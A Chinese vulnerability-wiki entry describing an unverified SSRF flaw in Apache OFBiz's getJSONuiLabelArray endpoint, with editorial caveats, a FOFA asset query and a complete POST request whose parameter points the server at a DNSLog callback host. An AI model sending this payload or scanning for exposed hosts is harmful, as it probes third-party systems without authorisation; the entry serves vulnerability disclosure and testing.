---
source: "wy876 漏洞文库"
title: "Apace OFBiz getJSONuiLabelArray存在服务端请求伪造ssrf漏洞"
product: "Apache OFBiz getJSONuiLabelArray"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
identifier_status: "unknown"
primary_identifiers: ""
referenced_identifiers: ""
identifier_role: "unknown"
prerequisites: "partymgr端点可达且可未认证或有访问权限，后端可外联资源URL"
source_status: "unknown"
side_effects: "涉及 LDAP/RMI/DNS/HTTP 外带：回连只证明相应网络交互，不能单独证明命令执行；使用自控接收端，避免把日志、凭据或真实业务数据发送给第三方。"
id: "vw-e5cab2e19fee5fb5ee5c78f2"
entity_id: "ve-e5cab2e19fee5fb5ee5c78f2"
schema_version: "1"
---

# Apace OFBiz getJSONuiLabelArray存在服务端请求伪造ssrf漏洞

<!-- vulwiki-editorial:start -->
## 校订与适用边界

- 适用前提：partymgr端点可达且可未认证或有访问权限，后端可外联资源URL
- 证据范围：JSON键为HTTPS资源并用DNSLog观察，但未给响应或日志，DNS解析不等于任意网络内容可读

### 本次正文校订

- 按实际内容修正 1 处代码围栏语言标记，保留其中方法与请求内容。

### 尚未解决的证据缺口

以下限制仍适用于后文历史材料；相关版本、结果或修复结论不能据此视为已验证：

- 影响版本仅产品名，缺认证前提/修复/根因
- Apache拼写错误
- 附件未取回，不能声称模板验证成功

### 操作风险与资料使用

- 涉及 LDAP/RMI/DNS/HTTP 外带：回连只证明相应网络交互，不能单独证明命令执行；使用自控接收端，避免把日志、凭据或真实业务数据发送给第三方。

本页为文本校订，未执行代码、PoC 或目标请求；原图仅保留引用，未据此确认复现成功。
<!-- vulwiki-editorial:end -->

## 技术正文与历史材料

# 一、漏洞简介
<font style="color:rgb(36, 41, 46);">Apache OFBiz是一个非常著名的电子商务平台，是一个非常著名的开源项目，提供了创建基于最新J2EE/XML规范和技术标准，构建大中型企业级、跨平台、跨数据库、跨应用服务器的多层、分布式电子商务类WEB应用系统的框架。OFBiz最主要的特点是OFBiz提供了一整套的开发基于Java的web应用程序的组件和工具。包括实体引擎, 服务引擎, 消息引擎, 工作流引擎, 规则引擎等。Apace OFBiz getJSONuiLabelArray存在服务端请求伪造ssrf漏洞。</font>

# <font style="color:rgb(36, 41, 46);">二、影响版本</font>
+ Apace OFBiz

# 三、资产测绘
+ fofa`app="Apache_OFBiz"`
+ 特征


# 四、漏洞复现
1. 获取dnslog地址

```plain
v3f9em.dnslog.cn
```


2. 测试是否存在漏洞

```http
POST /partymgr/control/getJSONuiLabelArray HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2656.18 Safari/537.36
Content-Length: 79
Accept-Encoding: gzip, deflate
Connection: close
Content-Type: application/x-www-form-urlencoded

requiredLabels={"https://v3f9em.dnslog.cn/api":["2aZ6okJyCI0H8XLAUeiv9Yu3wOK"]}
```


[apache-OFBiz-getjsonuilabelarray-服务端请求伪造.yaml](https://www.yuque.com/attachments/yuque/0/2024/yaml/1622799/1709222253157-27d1351f-0247-4560-b9a5-3c8db0b44532.yaml)


> 原文: <https://www.yuque.com/xiaokp7/ocvun2/ciyvexuvwfhmzuq5>


---

> 来源：wy876 漏洞文库（https://github.com/wy876/POC (备份镜像 DMW11525708/wiki)）
